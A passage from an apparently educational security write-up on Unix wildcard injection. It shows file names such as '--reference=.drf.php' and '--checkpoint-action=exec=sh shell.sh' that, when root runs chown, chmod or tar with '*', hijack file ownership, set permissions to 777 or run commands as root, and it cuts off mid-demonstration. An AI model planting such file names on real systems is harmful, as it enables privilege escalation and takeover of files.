<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">password</span><span class="o">.</span><span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group &#8216;nobody&#8217;, but somehow, all files are owned by the user &#8216;leon&#8217; now. If we take closer look, this directory previously contained just the following two files created and owned by the user &#8216;leon&#8217;.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Thing is that wildcard character used in &#8216;chown&#8217; command line took arbitrary &#8216;&#8211;reference=.drf.php&#8217; file and passed it to the chown command at the command line as an option.</p>
<p>Let&#8217;s check chown manual page (man chown):</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>     <span class="n">use</span> <span class="n">RFILE</span><span class="s1">&#39;s owner and group rather than specifying OWNER:GROUP values</span>
</pre></div>
</div>
<p>So in this case, &#8216;&#8211;reference&#8217; option to &#8216;chown&#8217; will override &#8216;nobody:nobody&#8217; specified as the root, and new owner of files in this directory will be exactly same as the owner of &#8216;.drf.php&#8217;, which is in this case user &#8216;leon&#8217;. Just for the record, &#8216;.drf&#8217; is short for Dummy Reference File. :)</p>
<p>To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument  to the &#8211;reference option, file that&#8217;s owned by some other user, not &#8216;leon&#8217;, in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically &#8220;hijack&#8221; files that are of interest to us.</p>
<p>Even more, if user &#8216;leon&#8217; previously created a symbolic link in that directory that points to let&#8217;s say /etc/shadow, ownership of /etc/shadow would also be changed to the user &#8216;leon&#8217;.</p>
</div>
<div class="section" id="chmod-file-reference-trick">
<h4>Chmod file reference trick<a class="headerlink" href="#chmod-file-reference-trick" title="Permalink to this headline">¶</a></h4>
<p>Another interesting attack vector similar to previously described &#8216;chown&#8217; attack is &#8216;chmod&#8217;. Chmod also has &#8211;reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>    <span class="p">:</span>   <span class="n">use</span> <span class="n">RFILE</span><span class="s1">&#39;s mode instead of MODE values</span>
</pre></div>
</div>
<p>Example is presented below.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">68</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Superuser will now try to set mode 000 on all files.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># chmod 000 *</span>
</pre></div>
</div>
<p>Let&#8217;s check permissions on files...</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">68</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>What happened? Instead of 000, all files are now set to mode 777 because of the &#8216;&#8211;reference&#8217; option supplied through file name..Once again,file .drf.php owned by user &#8216;leon&#8217; with mode 777 was used as reference file and since &#8211;reference option is supplied, all files will be set to mode 777. Beside just &#8211;reference option, attacker can also create another file with &#8216;-R&#8217; filename, to change file permissions on files in   all subdirectories recursively.</p>
</div>
<div class="section" id="tar-arbitrary-command-execution">
<h4>Tar arbitrary command execution<a class="headerlink" href="#tar-arbitrary-command-execution" title="Permalink to this headline">¶</a></h4>
<p>Previous example is nice example of file ownership hijacking. Now, let&#8217;s go to even more interesting stuff like arbitrary command execution.            Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># tar cvvf archive.tar *</span>
</pre></div>
</div>
<p>So, what&#8217;s the problem with &#8216;tar&#8217;? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let&#8217;s check tar manual page (man tar):</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">checkpoint</span><span class="p">[</span><span class="o">=</span><span class="n">NUMBER</span><span class="p">]</span>      <span class="p">:</span> <span class="n">display</span> <span class="n">progress</span> <span class="n">messages</span> <span class="n">every</span> <span class="n">NUMBERth</span> <span class="n">record</span> <span class="p">(</span><span class="n">default</span> <span class="mi">10</span><span class="p">)</span>
<span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">ACTION</span> <span class="p">:</span> <span class="n">execute</span> <span class="n">ACTION</span> <span class="n">on</span> <span class="n">each</span> <span class="n">checkpoint</span>
</pre></div>
</div>
<p>There is &#8216;&#8211;checkpoint-action&#8217; option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.</p>
<p>Check the following directory:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">72</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">34</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">19</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">exec</span><span class="o">=</span><span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">12</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
</pre></div>
</div>
<p>Now, for example, root user wants to create archive of all files in current directory.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># tar cf archive.tar *</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
</pre></div>
</div>
<p>Boom! What happened? /usr/bin/id command gets executed! We&#8217;ve just achieved arbitrary command execution under root privileges. Once again, there are few files created by user &#8216;leon&#8217;.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">19</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">exec</span><span class="o">=</span><span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
  <span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">12</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>

<span class="n">Options</span> <span class="s1">&#39;--checkpoint=1&#39;</span> <span class="ow">and</span> <span class="s1">&#39;--checkpoint-action=exec=sh shell.sh&#39;</span> <span class="n">are</span> <span class="n">passed</span> <span class="n">to</span> <span class="n">the</span> <span class="s1">&#39;tar&#39;</span> <span class="n">program</span> <span class="k">as</span> <span class="n">command</span> <span class="n">line</span> <span class="n">options</span><span class="o">.</span> <span class="n">Basically</span><span class="p">,</span> <span class="n">they</span> <span class="n">command</span> <span class="n">tar</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span> <span class="n">shell</span> <span class="n">script</span> <span class="n">upon</span> <span class="n">the</span> <span class="n">execution</span><span class="o">.</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell.sh</span>
